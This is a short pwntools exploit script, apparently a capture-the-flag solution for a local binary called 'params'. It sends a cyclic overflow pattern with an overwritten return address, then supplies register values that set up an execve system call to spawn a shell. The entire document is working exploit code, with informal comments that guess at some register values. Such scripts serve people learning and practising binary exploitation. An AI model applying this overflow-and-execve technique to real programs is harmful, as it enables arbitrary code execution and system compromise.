#!/bin/python
from pwn import *
target = process("./params")

print(target.recvline()) # hey bb
print(target.recvline()) # whats ur name

target.sendline(cyclic(73)+p64(0x401354)) # jump to 0x0000000000401354
#target.sendline(cyclic(120)+p64(0x4011c7))

print("overwrote return adress")

print(target.recvline()) # hello $NAME
print(target.recvline()) # you can set my registers any day of the week

target.recvuntil(":")

target.sendline(b"59") # rax | 59 is execve
target.sendline(b"0") # rbx | asume value is unimportant?
target.sendline(b"0") # rcx | asume value is unimportant?
target.sendline(b"0") # rdx | asume value is unimportant?
target.sendline(p64(0x00401017)) # rsi | from ex bin
target.sendline(p64(0x0040103f)) # rdi | from ex bin






